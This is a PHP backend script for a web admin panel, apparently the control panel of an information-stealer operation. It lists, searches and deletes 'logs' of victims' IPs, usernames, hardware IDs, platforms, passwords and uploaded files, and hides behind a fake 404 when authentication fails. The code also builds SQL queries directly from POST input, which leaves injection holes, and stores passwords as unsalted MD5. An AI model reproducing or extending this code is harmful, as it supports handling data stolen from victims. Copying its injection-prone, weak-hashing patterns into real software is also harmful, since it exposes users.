<?php
	header('Content-Type: application/json');
	set_time_limit(0);
	include('functions.php');

	if(!change_auth($login,$hash)){ header('HTTP/1.0 404 Not Found');exit; }
	
	$act = strip_tags($_POST['act']);
	
	$pass = strip_tags($_POST['pass_old']);
	$pass_n = strip_tags($_POST['pass_n']);
	$pass_n1 = strip_tags($_POST['pass_n1']);
	
	
	if(($act == 'change_pass') && (!empty($pass)) && (!empty($pass_n)) && (!empty($pass_n1)))
	{
		
		if(md5($pass) === $hash){} else { echo json_encode(array('error'=>'bad_pass','stat'=>'0'));exit; }
		
		if(md5($pass_n) === md5($pass_n1))
		{ 
			$pass_new = md5($pass_n);
			$s = "UPDATE `Accounts` SET `Password` = '$pass_new' WHERE `Password` = '$hash' AND `Email` = '$login'";
			mysqli_query($db,$s);;
			echo json_encode(array('error'=>'0','stat'=>'1')); 
		} else { echo json_encode(array('error'=>'error_pass','stat'=>'0'));  }
		
	}
	

	$id = strip_tags($_POST['id']);
	$sort = strip_tags($_POST['sort']);
	$type = strip_tags($_POST['type']);
	if($act == 'uppdate_log')
	{
		
			switch($sort)
			{
				case 0: $th0 = 'active';break;
				case 1: $th1 = 'active';break;
				case 2: $th2 = 'active';break;
				case 3: $th3 = 'active';break;
				case 4: $th4 = 'active';break;
			}		
			
		$code = '<table border="1" >
				<th> <i class="fa fa-sort sorted '.$th0.'" aria-hidden="true" value="0" title="Сортировать"></i> Date</th>
				<th><i class="fa fa-sort sorted '.$th1.'" aria-hidden="true" value="1" title="Сортировать"></i> IP</th>
				<th><i class="fa fa-sort sorted '.$th2.'" aria-hidden="true" value="2" title="Сортировать"></i> User</th>
				<th><i class="fa fa-sort sorted '.$th3.'" aria-hidden="true" value="3" title="Сортировать"></i> Hwid</th>
				<th><i class="fa fa-sort sorted '.$th3.'" aria-hidden="true" value="3" title="Сортировать"></i> Platform</th>
				<th><i class="fa fa-sort sorted '.$th4.'" aria-hidden="true" value="4" title="Сортировать"></i> File</th>
				<th></th>
				';
		
		if((empty($sort)) && (empty($type)))
		{
			$s = "SELECT `id`,`ip`,`file`,`user`,`hwid`,`ip_info`,`date`,`platform` FROM `logs` ORDER BY `id` DESC";
		} else
				{
					switch($sort)
					{
						case 0: $col = 'date';break;
						case 1: $col = 'ip';break;
						case 2: $col = 'user';break;
						case 3: $col = 'hwid';break;
						case 4: $col = 'file';break;
					}
					
					switch($type) # доп.проверка
					{
						case 'desc': $t = 'desc';break;
						case 'asc': $t = 'asc';break;
						default: $t = 'desc';
					}
					
					$s = "SELECT `id`,`ip`,`file`,`user`,`hwid`,`ip_info`,`date` FROM `logs` ORDER BY `$col` $t";
				}
		

		
			$r = mysqli_query($db,$s);;
			$num = mysqli_num_rows($r);
			while($ok = mysqli_fetch_assoc($r))
			{ 	
				$unix = intval($ok['date']);
				$log = site_dir.'/files/'.$ok['file'];
				
				$log_name = substr($ok['file'],0,25);
				$file_ = $_SERVER['DOCUMENT_ROOT'].site_dir.'/files/'.$ok['file'];
				$size = get_filesize($file_);
				
				if($unix > 1){ $date = date('d.m.Y h:i',$unix); } else { $date = ''; }
				$ip = '<i class="fa fa-info-circle ip" ip="'.$ok['id'].'" aria-hidden="true"></i>';
				$code .=  '<tr id="log_'.$ok['id'].'"><td >'.$date.'</td><td>'.$ip.' '.$ok['ip'].'</td><td>'.$ok['user'].'</td><td>'.$ok['hwid'].'</td><td>'.$ok['platform'].'</td><td><a href="'.$log.'" target="_blank">' .$log_name." <b class='size'>[$size]</b>".'</a></td><td style="width:9px;"><b class="del_log" value="'.$ok['id'].'" title="Удалить запись?">X</b></td></tr>';
			}
			$code .= '</table>';
			
		echo json_encode(array('code'=>$code,'stat'=>'1','coun'=>$num,));
	}
	
	
	
	
	$id = strip_tags($_POST['id']);
	if($act == 'del_log')
	{
		$s = "DELETE FROM `logs` WHERE `id` = '$id'";
		mysqli_query($db,$s);
		echo json_encode(array('on'=>'del','stat'=>'1'));
	}
	

	
	
	$col = strip_tags($_POST['col']);
	$text = strip_tags($_POST['text']);
	if($act == 'search')
	{
		
			switch($sort)
			{
				case 0: $th0 = 'active';break;
				case 1: $th1 = 'active';break;
				case 2: $th2 = 'active';break;
				case 3: $th3 = 'active';break;
				case 4: $th4 = 'active';break;
				case 5: $th5 = 'active';break;
			}		
			
		$code = '<table border="1" >
				<th> <i class="fa fa-sort sorted '.$th0.'" aria-hidden="true" value="0" title="Сортировать"></i> Date</th>
				<th><i class="fa fa-sort sorted '.$th1.'" aria-hidden="true" value="1" title="Сортировать"></i> IP</th>
				<th><i class="fa fa-sort sorted '.$th2.'" aria-hidden="true" value="2" title="Сортировать"></i> User</th>
				<th><i class="fa fa-sort sorted '.$th3.'" aria-hidden="true" value="3" title="Сортировать"></i> Hwid</th>
				<th><i class="fa fa-sort sorted '.$th4.'" aria-hidden="true" value="4" title="Сортировать"></i> File</th>
				<th><i class="fa fa-sort sorted '.$th5.'" aria-hidden="true" value="5" title="Сортировать"></i> </th>
				<th></th>
				';

				switch($col)
				{
					case 0: $col_ = 'date';break;
					case 1: $col_ = 'ip';break;
					case 2: $col_ = 'user';break;
					case 3: $col_ = 'pwd';
				}
					 
				$s = "SELECT `id`,`ip`,`file`,`user`,`hwid`,`ip_info`,`date` FROM `logs` WHERE `$col_` LIKE '%$text%'";
	
				$r = mysqli_query($db,$s);;
				$num = mysqli_num_rows($r);
				while($ok = mysqli_fetch_assoc($r))
				{ 	 
					$unix = intval($ok['date']);
					$log = site_dir.'/files/'.$ok['file'];
					
					$file_ = $_SERVER['DOCUMENT_ROOT'].site_dir.'/files/'.$ok['file'];
					$size = get_filesize($file_);
					
					if($unix > 1){ $date = date('d.m.Y h:i',$unix); } else { $date = ''; }
					$ip = '<i class="fa fa-info-circle ip" ip="'.$ok['id'].'" aria-hidden="true"></i>';
					$code .=  '<tr id="log_'.$ok['id'].'"><td >'.$date.'</td><td>'.$ip.' '.$ok['ip'].'</td><td>'.$ok['user'].'</td><td>'.$ok['hwid'].'</td><td><a href="'.$log.'" target="_blank">' .$ok['file']." <b class='size'>[$size]</b>".'</a></td><td style="width:9px;"><b class="del_log" value="'.$ok['id'].'" title="Удалить запись?">X</b></td></tr>';
				}
				$code .= '</table>';
			echo json_encode(array('code'=>$code,'stat'=>'1','coun'=>$num));
					
	}				
	
	$id = strip_tags($_POST['id']);
	if($act == 'info_ip')
	{
		$s = "SELECT `ip_info` FROM `logs` WHERE `id` = '$id'";

		$r = mysqli_query($db,$s);;
		$ok = mysqli_fetch_assoc($r);
		
		echo json_encode(array('info'=>$ok['ip_info'],'stat'=>'1'));
	}


?>